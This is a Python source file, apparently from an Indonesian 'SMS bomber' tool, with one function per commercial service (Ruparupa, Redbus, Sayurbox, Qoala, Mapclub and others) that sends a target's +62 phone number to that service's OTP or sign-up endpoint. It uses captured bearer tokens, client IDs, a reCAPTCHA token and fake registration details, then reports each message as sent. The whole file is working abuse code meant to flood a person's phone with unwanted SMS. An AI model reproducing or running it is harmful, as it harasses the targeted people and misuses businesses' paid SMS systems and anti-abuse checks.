from novia import setup as s
import base64

def rupa(n):
	dt = s.jd({"phone":f"0{n}","action":"register","channel":"message","email":"","token":0,"customer_id":"0","is_resend":0})
	hd = {'Host': 'wapi.ruparupa.com','authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiNmQwODgxMTEtMzBkYy00NzJmLTkyMGItZTU0MDJkZDlkMTYyIiwiaWF0IjoxNjY2ODc0MTk2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.m3DThsLE62zkPMIEJGH8GI6uubJe5h4VD80ksEdCIx4','user-agent': ''+s.ua,'content-type': 'application/json','x-company-name': 'odi','accept': 'application/json','informa-b2b': 'false','origin': 'https://www.ruparupa.com','referer': 'https://www.ruparupa.com/verification?page=otp-choices'}
	main = s.rp('https://wapi.ruparupa.com/auth/generate-otp', headers=hd, data=dt)
	if "success" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

#if "success" in main.text:
#print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}{n}');
#else:
#print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}{n}');

def eci(n):
	dt = s.jd({"identity":f"0{n}","with":"sms"})
	hd = {'Host': 'eci.id','Accept': 'application/json, text/plain, */*','Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent':''+s.ua}
	main = s.rp('https://eci.id/api/signup', headers=hd, data=dt)
	if "success" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

def kdok(n):
	dt = s.jd({"phone":f"62{n}"})
	hd = {'Host': 'api.medkomtek.com','accept': 'application/json','x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjIuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJ2aXZvIDE4MjAiLCJkZXNjcmlwdGlvbiI6IkNocm9tZSBNb2JpbGUgMTA2LjAuMC4wIG9uIHZpdm8gMTgyMCAoQW5kcm9pZCA4LjEuMCkifQ==','content-type': 'application/json','user-agent':''+s.ua}
	main = s.rp('https://api.medkomtek.com/v2/publishing/users/check', headers=hd, data=dt)
	if "Success" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

def lumma(n):
	dt = s.jd({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":f"+62{n}","hashCode":"","channel":"SMS","userType":"MERCHANT","reCaptchaToken":"03AIIukziFoais3-6LL8xNupcoZNz1frp_ijhbNRZJwIvWVG5QBEpkCUlla1Em21Ix1K8e1sFoS1gyglFpphShKac_hb2u4UeE5HJef8mOhIiVwcsNrX8Vm-QJU1_N7sG71SFI59tHCb671GSUmsei5ISDvnU5mAujb7d70uvPir3p3kZTSo_ZOvPFgHRY7noPogTRlGBlmUj1JjPiWI6FExaVPJTjCIqSujFmIeFfIFyEtzVZBhJj7pldS9sFB_9GsoQgRi-fKjxVN-43p1aEv_1IRk_dXmDPvqS0v0RTPdagp7OAiK2u5zGIswSUc-yjzKltF-SdzxhLb4onpZIlNF9H_ZORO20wwfZPMCPl4t7zETMv27GZLu6ERGnyWOJRVAy86AqxlIOYOCUNR9A5fKr3rKzVuczi5hzMmqX5f7HASp6V5nV5rXMvSrcfsNaX1DOCLNP59WnMOs9jqlEBB899yYZvAofkNKEoAGnCD6Uu8mazJEbhZ3mpWK0OrLXigwWpcuv8l6Ctebz8dmIbi0kVc4nZZrC8kBibW34PyWOIk5HFEbRz7SRHaC93opjCh2Fu5oVNvcboRZorCedXlAiUC5F5tJZjJlN8BbytGifprDPuML7-bWE7SeY3o_zz-dlkLhc6-OQz9vs0cDeUlSAwNlYb1wSudtpEWot5XNzozFRSD1Kb7RK4sW0-bSJnHkGVYmCmlxQ_iotxlcrdsjuLjbtq-153OJPPBYvz3OlwgIJ3y4MdJnY1qdW7DEivZuNMUZBD91GoblFEor-dYIkwxeoGHpVZE6z6bLWkiyQ0Lpone4la_Yu5DMoXPhMDJ3jkQmOXOtnL4lknUV7zEEXMSk7cBoLOucqFX-lsIs2ecfV1Pm4BachEAtThBHEoasmsvoaU0VCon_4doItT6gBvSfHysytUaqDAeUnBUR6dsg6n1l99RZpvXhNoJs_8Jil2Pc8ySuC531_UngtWZCG6lQHf9d__jDYtEjLE0UV9QxkjKC-72uZSs6pKfRnq12W24-Y_5tPcUqqw3kMh9opbGi8swSQI2wPCG94U55onQ7CvwXIYBKlfMNxOl0zGenWt-8IgGg6VUFGaKYplohdi5aSrH-exx-vMPAq8i6ms9FKuQPd5G8sTEhR5uZuz2ocTLfAW93kj6MDw8Ob_jTLILarhe07ox4XWIgsVeqAzvZ59R9pztLO0X1htgVFYU67l5HBToIvouO-qVDBBne5RK6teFB08H3_bvfV2W0fH2KTO3Luc3g6EjfHXpMkNRu8atgQwoXDfzjIjhrtJdDz2yxq0xgFs1tmlnLdErqjQE7vgc2gSIxOOPd7uUYZF_axVpBC-7KfYO1myLfsr-oLAbcX2yfNacI2Xj468iCFMRxFtvgYJcL8I66FCT8ziks07XaK57e9OhbGtT8EPlyd1H0D3rF2hncreO9U3hUPb4L0I8z_OSvi7jDUi7zv9M3vphVTt34Kqyxidf8RXKX6IUIPlXf-z6XjFRiUmHnaacfmJSzp5SO-ZdcBERKNsbSIti8DBmUquwJb3stkV4imhfop6sANqkQ"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
	hd = {'Host': 'api.tokko.io','content-type': 'application/json','accept': '*/*','x-tokko-api-client': 'merchant_web','user-agent':''+s.ua}
	main = s.rp('https://api.tokko.io/graphql', headers=hd, data=dt)
	if "phoneNumber" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');


#def olx(n):
#	dt = s.jd({"grantType":"phone","phone":f"+62{n}","language":"id"})
#	hd = {'Host': 'www.olx.co.id','x-panamera-fingerprint': '65a723289ccb54b9886c905c870a4ffa#1665596461438','content-type': 'application/json','origin': 'https://www.olx.co.id'}
#	main = s.rp('https://www.olx.co.id/api/auth/authenticate', headers=hd, data=dt)
#	if "PENDING" in main.text:
#		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}{n}');
#	else:
#		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}{n}');

def qoala(n):
	dt = s.jd({"fullName":"Jelayna","email":"jamahlext@gmail.com","phoneNumber":f"+62{n}","identityType":"KTP","nationality":"ID","password":"1234Az_he","passwordConfirmation":"1234Az_he","lang":"id"})
	hd = {'Host': 'api.qoala.app','Accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8','origin': 'https://www.qoala.app','user-agent':''+s.ua,'referer':'https://www.qoala.app/'}
	main = s.rp('https://api.qoala.app/api/registrations', headers=hd, data=dt)
	if "success" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

def redbus(n):
	hd = {'Host': 'm.redbus.id','accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8','user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','origin': 'https://m.redbus.id'}
	dt = s.jd({"mobileNo":f"{n}","phoneCode":"62"})
	main = s.rp('https://m.redbus.id/help/api/cx/generateOtp', headers=hd, data=dt)
	if "true" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

def sayurbox(n):
	hd = {'Host': 'www.sayurbox.com','authorization': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY1Nzg3NzgzLCJleHAiOjE2NjgzNzk3ODMsImlhdCI6MTY2NTc4Nzc4MywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijc4YTA4NDFiLTFkNWUtNDU3OS1iZjQ4LWM0ODMzNTcxZDA2NSIsInN1YiI6Ik9ubnFTbVNtczFrRkZJQklHWWNCUl9ZWWFqc28iLCJ1c2VyX2lkIjoiT25ucVNtU21zMWtGRklCSUdZY0JSX1lZYWpzbyJ9.L9Gsl3FcDDHvXyYjpgHNwUZ6FL0PzLRIWDUp9gtpbb-g1j1EyUkf5K-pZwiT2Sybc93N8UX1lDh-A3c9gpjn-1p1xtfAYwwcqn_u5f9z-ed6yzR_9NQmmnWJxTym-3FU7qfY2NlaIEnTeYUNV7Jdk_DxbQLZ78ztvk-AXlVHqWMB1x-tXlDa85PdIi8eXOoprCkUGBfY26yQ3jltQgwz_QL0-LLEClYqy_D57CZNXOBnBgrqccjDbZYlXLkIjC9-cjhQLgFl-5HyBFNScOVQzfnICRTdTU6yeo993zEZ2rmhTWAzgknP8fH1hC6dw7T6wEL1O7_aqF5N-sTlQio23Q','content-type': 'application/json','origin': 'https://www.sayurbox.com','user-agent':''+s.ua}
	dt = s.jd([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":f"+62{n}"},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
	main = s.rp('https://www.sayurbox.com/graphql/v1?deduplicate=1', headers=hd, data=dt)
	if "AuthIDResponseType" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

def momobil(n):
	hd = {'User-Agent': ''+s.ua,'Content-Type': 'application/json','Accept': '*/*','Origin': 'https://momobil.id'}
	dt = s.jd({"to":f"0{n}","type":"register"})
	main = s.rp('https://api.momobil.id/users/otp/send', headers=hd, data=dt)
	if "MESSAGE_SENT" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}+62{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}+62{n}');

def momotor(n):
	sample_string = f"0{n}-M0M0T0RK3Y"
	sample_string_bytes = sample_string.encode("ascii")
	base64_bytes = base64.b64encode(sample_string_bytes)
	base64_string = base64_bytes.decode("ascii")
	hd = {'Host': 'api.momotor.id','accept': '*/*','content-type': 'application/json','user-agent': ''+s.ua,'origin': 'https://momotor.id','referer': 'https://momotor.id/'}
	dt = s.jd({"to":f"{base64_string}"})
	main = s.rp('https://api.momotor.id/users/motor/send-otp', headers=hd, data=dt)
	if "pinId" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}{n}');

def mapclub(n):
	hd = {'Host': 'beryllium.mapclub.com','client-platform': 'WEB','client-timestamp': '1667049152771','accept-language': 'en-US','sec-ch-ua-mobile': '?1','authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI5YTNlNWU2Ni1mNTkyLTQ2MzQtYjQ1OS0yYzk2ZjlhOTQ3YjgiLCJleHBpcmVkIjoxNjY3MDUwNTYzMTcwLCJleHBpcmUiOjM2MDAsImV4cCI6MTY2NzA1MDU2MywiaWF0IjoxNjY3MDQ2OTYzLCJwbGF0Zm9ybSI6IldFQiJ9.gl0GgO6AD7K9lTDMwlzLrq_KvVmhUTHX7x9Ae5UlGFSqZ91mtSTbblyZ0f6Ic5WZZnr185yRgMnzgTe_OUc2EA','user-agent': ''+s.ua,'content-type': 'application/json','accept': 'application/json, text/plain, */*',"sec-ch-ua-platform": "Android",'origin': 'https://www.mapclub.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.mapclub.com/','accept-encoding': 'gzip, deflate, br'}
	dt = s.jd({"account":f"0{n}"})
	main = s.rp('https://beryllium.mapclub.com/api/member/registration/sms/otp', headers=hd, data=dt)
	if "true" in main.text:
		print(f'{s.m} [{s.p} ✓{s.m} ]{s.p} Sms Succesfully Sending To {s.h}{n}');
	else:
		print(f'{s.m} [{s.p} x{s.m} ]{s.p} Sms Failed Sending To {s.a}{n}');
